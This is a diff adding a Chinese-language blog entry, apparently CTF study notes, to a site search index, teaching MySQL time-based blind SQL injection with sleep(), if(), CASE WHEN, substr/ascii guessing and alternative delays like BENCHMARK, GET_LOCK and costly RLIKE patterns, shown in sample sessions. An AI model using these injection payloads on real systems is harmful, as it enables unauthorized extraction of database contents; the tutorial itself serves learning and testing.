@@ -4111,4 +4111,111 @@ Flask是一个使用Python编写的轻量级web应用框架，其WSGI工具箱�
         <tag>Web 安全</tag>
       </tags>
   </entry>
+  <entry>
+    <title>基于时间的盲注</title>
+    <url>/%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8/</url>
+    <content><![CDATA[<p>时间盲注详解</p>
+<span id="more"></span>
+
+<h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h2><p>时间盲注指通过页面执行的时间来判断数据内容的注入方式，通常用于数据（包含逻辑型）不能返回到页面中的场景，无法利用页面回显判断数据内容，只能通过执行的时间来获取数据。</p>
+<p>在执行语句的过程中，由于 sleep(duration) 函数的存在，保证是注入导致的延时，而不是业务正常处理导致的延时。</p>
+<h2 id="2-原理演示"><a href="#2-原理演示" class="headerlink" title="2. 原理演示"></a>2. 原理演示</h2><h3 id="2-1-sleep-函数"><a href="#2-1-sleep-函数" class="headerlink" title="2.1 sleep 函数"></a>2.1 sleep 函数</h3><ul>
+<li>sleep(duration)<ul>
+<li>睡眠时间为 duration 参数给定的秒数，然后返回0；若函数被中断，返回1。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from user;</span></span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | admin    | 12345678 |</span><br><span class="line">|  2 | admin1   | aaaa     |</span><br><span class="line">|  3 | admin2   | aaaa     |</span><br><span class="line">|  4 | admin3   | aaaa     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">4 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select sleep(3);</span></span><br><span class="line">+----------------------+</span><br><span class="line">| sleep(3)             |</span><br><span class="line">+----------------------+</span><br><span class="line">| 0                    |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (3.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from user <span class="built_in">where</span> id = 1 and sleep(3);</span></span><br><span class="line">Empty set (3.01 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from user <span class="built_in">where</span> id = 5 and sleep(3);</span></span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>sleep(3) 执行完成后返回 0，所以 <code>select * from user where id = 1 and sleep(3)</code>查询 0 条数据</p>
+<p>and 的逻辑是如果 and 左侧表达式为假，则直接返回假，不再直接右侧表达式。所以当 id=5 查不到数据时，直接就会返回结果，这样就可以用布尔注入逻辑，根据执行的时长，来测试是否查到数据。</p>
+<p>如果 and 逻辑换成 or，又会有变化。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from user <span class="built_in">where</span> id = 1 or sleep(3);</span></span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | admin    | 12345678 |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (9.01sec)</span><br></pre></td></tr></table></figure>
+<p>or 逻辑是左侧若为真则不判断右侧表达式，所以 id=1 这条执行了 0.01 sec，接下来 id=2,3,4 这几条数据都会执行 sleep(3)，总共是 9.01sec。（可能不是所有版本都是这样的逻辑）</p>
+<h3 id="2-2-配合-if-条件触发"><a href="#2-2-配合-if-条件触发" class="headerlink" title="2.2 配合 if  条件触发"></a>2.2 配合 if  条件触发</h3><ul>
+<li>if(expr1, expr2, expr3)<ul>
+<li>如果 expr1 是 True，则返回 expr2，否则返回 expr3</li>
+<li>返回值是数字值或字符串值<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from user <span class="built_in">where</span> id = 5 or <span class="keyword">if</span>(username = <span class="string">&#x27;admin&#x27;</span>, 1, 0);</span></span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | admin    | 12345678 |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (9.01sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from user <span class="built_in">where</span> id = 1 and <span class="keyword">if</span>(database()=<span class="string">&#x27; &#x27;</span>, sleep(4), null);</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h3 id="2-3-截取函数"><a href="#2-3-截取函数" class="headerlink" title="2.3 截取函数"></a>2.3 截取函数</h3><p>配合截取函数，能够判断猜测的某一位数据是否准确</p>
+<p>单个字母爆破</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from user <span class="built_in">where</span> username=<span class="string">&#x27;a&#x27;</span> or <span class="keyword">if</span>(substr((select username from user <span class="built_in">where</span> id = 1), 1, 1) = <span class="string">&#x27;a&#x27;</span> , sleep(3), 0)</span>  </span><br></pre></td></tr></table></figure>
+<ul>
+<li>substring<ul>
+<li>substring(str, pos)</li>
+<li>substring(str FROM pos)</li>
+<li>substring(str, pos, len)</li>
+<li>substring(str FROM pos FOR len)</li>
+</ul>
+</li>
+<li>substr(str, start, length)</li>
+<li>mid(str, start, length)</li>
+<li>substring_index(str, delim, count) <ul>
+<li>str：被截取字符串</li>
+<li>delim：关键字</li>
+<li>count：关键字出现的次数 </li>
+</ul>
+</li>
+</ul>
+<p>实际上，使用正则表达式也能达到类似的效果,“^”表示从头开始匹配</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from user <span class="built_in">where</span> password rlike = <span class="string">&#x27;^1&#x27;</span>;</span></span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | admin    | 12345678 |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from user <span class="built_in">where</span> password regexp <span class="string">&#x27;^12&#x27;</span>;</span></span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | admin    | 12345678 |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00sec)</span><br></pre></td></tr></table></figure>
+
+<p>我们注意到，进行匹配时传入单个字符都需要引号，如果想不传入引号达到一样的效果，可以使用 ascii() 函数</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27; &#x27;</span>,sleep(<span class="number">4</span>),<span class="keyword">null</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">100</span>,sleep(<span class="number">4</span>),<span class="keyword">null</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-配合-select-case-when-条件触发"><a href="#2-4-配合-select-case-when-条件触发" class="headerlink" title="2.4 配合 select case when 条件触发"></a>2.4 配合 select case when 条件触发</h3><p>SQL CASE 表达式是一种通用的条件表达式，类似于其他语言中的  if…else… 语句</p>
+<blockquote>
+<p>CASE WHEN condition THEN result<br>[WHEN …]<br>[ELSE result]<br>END</p>
+</blockquote>
+<p>先来一个使用举例：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select <span class="keyword">case</span> when username = <span class="string">&#x27;admin&#x27;</span> THEN <span class="string">&#x27;aaa&#x27;</span> ELSE <span class="string">&#x27;xxxx&#x27;</span> end from user;</span></span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| case when username = &#x27;admin&#x27; THEN &#x27;aaa&#x27; ELSE &#x27;xxxx&#x27; end |</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">|  aaa                                                    |</span><br><span class="line">|  xxxx                                                   |</span><br><span class="line">|  xxxx                                                   |</span><br><span class="line">|  xxxx                                                   |</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">4 row in set (0.00sec)</span><br></pre></td></tr></table></figure>
+<p>可以与 sleep 或者其他形式结合</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">THEN</span> (sleep(<span class="number">3</span>)) <span class="keyword">ELSE</span> <span class="string">&#x27;xxxx&#x27;</span> <span class="keyword">end</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">case</span> <span class="keyword">when</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;aaa&#x27;</span> <span class="keyword">ELSE</span> <span class="string">&#x27;xxxx&#x27;</span> <span class="keyword">end</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">0</span>                                                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  xxxx                                                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  xxxx                                                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  xxxx                                                   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------+</span></span><br><span class="line"><span class="number">4</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">3.01</span>sec)</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-5-除-sleep-之外的延时"><a href="#2-5-除-sleep-之外的延时" class="headerlink" title="2.5 除 sleep 之外的延时"></a>2.5 除 sleep 之外的延时</h3><ul>
+<li><p>BENCHMARK(count, expr)</p>
+<ul>
+<li>重复 count 次执行表达式 expr。</li>
+<li>可以被用于计算 MySQL 处理表达式的速度</li>
+<li>结果值通常为0</li>
+</ul>
+</li>
+<li><p>笛卡尔积</p>
+<ul>
+<li>SELECT count(*) FROM information_schema.columns A, information_schema.colums B, information_schema.colums C;</li>
+<li>通过复杂的运算达到延时</li>
+</ul>
+</li>
+<li><p>GET_LOCK(str, timeout)</p>
+<ul>
+<li>使用字符串 str 给定的名字得到一个锁，超时为 timeout 秒</li>
+<li>局限：当前会话不会生效，只有新会话开启，并且保持长连接（ mysql_pconnect函数来连接数据库），才能生效<br>session 1<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select get_lock(<span class="string">&#x27;karma&#x27;</span>,1);</span></span><br><span class="line">+---------------------+</span><br><span class="line">| get_lock(&#x27;karma&#x27;,1) |</span><br><span class="line">+---------------------+</span><br><span class="line">|                   1 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+session 2<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select get_lock(<span class="string">&#x27;karma&#x27;</span>,10);</span></span><br><span class="line">+----------------------+</span><br><span class="line">| get_lock(&#x27;karma&#x27;,10) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    0 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (10.00 sec)</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>RLIKE</p>
+<ul>
+<li>通过 rpad 或 repeat 构造长字符串，加以计算量打的 pattern，通过 repeat 的参数可以控制延时长短<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select concat (rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>),rpad(1,999999,<span class="string">&#x27;a&#x27;</span>)) RLIKE <span class="string">&#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;</span></span></span><br><span class="line"></span><br><span class="line">*****</span><br><span class="line">1 row in set (0.51 sec)</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<p>————————————————</p>
+<ul>
+<li><a href="https://www.freebuf.com/articles/web/175049.html">浅谈SQL盲注测试方法解析与技巧</a></li>
+<li><a href="https://www.php.cn/mysql-tutorials-417450.html">MySQL中RLIKE运算符的使用详解</a></li>
+<li><a href="https://www.jianshu.com/p/0d607589e3ad">Mysql时间盲注手工注入详解</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>CTF</category>
+        <category>Web 安全</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>Web 安全</tag>
+      </tags>
+  </entry>
 </search>
